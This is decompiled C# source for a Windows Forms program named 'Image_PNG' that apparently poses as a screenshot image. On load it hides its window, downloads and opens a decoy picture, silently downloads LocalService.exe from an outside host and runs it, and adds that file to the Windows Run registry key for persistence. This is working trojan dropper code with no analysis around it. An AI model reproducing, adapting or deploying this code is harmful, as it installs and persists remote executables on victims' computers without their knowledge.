using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Image_PNG;

public class Form1 : Form
{
	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		string tempPath = Path.GetTempPath();
		WebClient webClient = new WebClient();
		string uriString = "http://i.imgur.com/qisivKl.jpg";
		string fileName = tempPath + "screenshot_12_27.png";
		Uri address = new Uri(uriString);
		webClient.DownloadFileAsync(address, fileName);
		Process process = new Process();
		process.StartInfo.FileName = tempPath + "screenshot_12_27.png";
		while (new FileInfo(tempPath + "screenshot_12_27.png").Length == 0L)
		{
			Thread.Sleep(500);
		}
		Thread.Sleep(500);
		try
		{
			process.Start();
		}
		catch
		{
		}
		string text = Path.GetTempPath().Remove(Path.GetTempPath().LastIndexOf("\\")).Remove(Path.GetTempPath().Remove(Path.GetTempPath().LastIndexOf("\\")).LastIndexOf("\\"));
		WebClient webClient2 = new WebClient();
		string uriString2 = "http://pic-screenshot.com/?file1=1";
		string text2 = text + "\\LocalService.exe";
		Uri address2 = new Uri(uriString2);
		webClient2.DownloadFileAsync(address2, text2);
		Process process2 = new Process();
		process2.StartInfo.FileName = text + "\\LocalService.exe";
		while (new FileInfo(text + "\\LocalService.exe").Length == 0L)
		{
			Thread.Sleep(500);
		}
		Thread.Sleep(500);
		try
		{
			process2.Start();
		}
		catch
		{
		}
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
		try
		{
			registryKey.SetValue("LocalService", text2);
			registryKey.Close();
		}
		catch
		{
		}
		((Control)this).set_Enabled(false);
		Application.Exit();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		((Form)this).set_ClientSize(new Size(0, 0));
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_SizeGripStyle((SizeGripStyle)2);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
